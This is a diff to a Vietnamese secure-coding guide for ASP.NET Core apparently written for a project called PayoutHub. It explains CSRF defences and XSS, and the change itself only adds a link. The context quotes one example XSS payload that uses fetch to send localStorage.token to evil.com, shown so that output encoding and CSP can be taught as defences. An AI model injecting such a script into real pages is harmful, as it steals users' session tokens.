@@ -334,7 +334,7 @@ Sửa bằng <T>parameterized query</T>. EF Core LINQ, LINQ to SQL, `SqlCommand`
 
 - Cookie đặt `SameSite=Lax` hoặc `Strict` (browser không gửi cookie trong request từ site khác).
 - **Antiforgery token**: một giá trị ngẫu nhiên trong form mà `evil.com` không đọc được (ASP.NET Core: `AddAntiforgery` + `[ValidateAntiForgeryToken]`; Web Forms có `ViewStateUserKey`).
-- PayoutHub gửi JWT qua header `Authorization`: browser **không tự gửi** header này, nên CSRF không áp dụng. CSRF chỉ là vấn đề khi dùng cookie.
+- PayoutHub gửi JWT qua header `Authorization`: browser **không tự gửi** header này, nên CSRF không áp dụng. CSRF chỉ là vấn đề khi dùng cookie. Chi tiết: [Chống CSRF khi dùng cookie](/aspnet-core/authentication-jwt#csrf).
 
 **XSS** (Cross-Site Scripting): dữ liệu do user nhập (vd ghi chú payout `<script>fetch('https://evil.com?t='+localStorage.token)</script>`) được hiển thị lại thành HTML, và script chạy trong browser của **người xem**, với quyền của họ. Chặn bằng <T>output encoding</T> ở lớp đầu (Razor và React làm tự động; nguy hiểm khi dùng `Html.Raw`, `innerHTML`, `dangerouslySetInnerHTML`) và <T>CSP</T> ở lớp thứ hai nếu encoding sót.
 
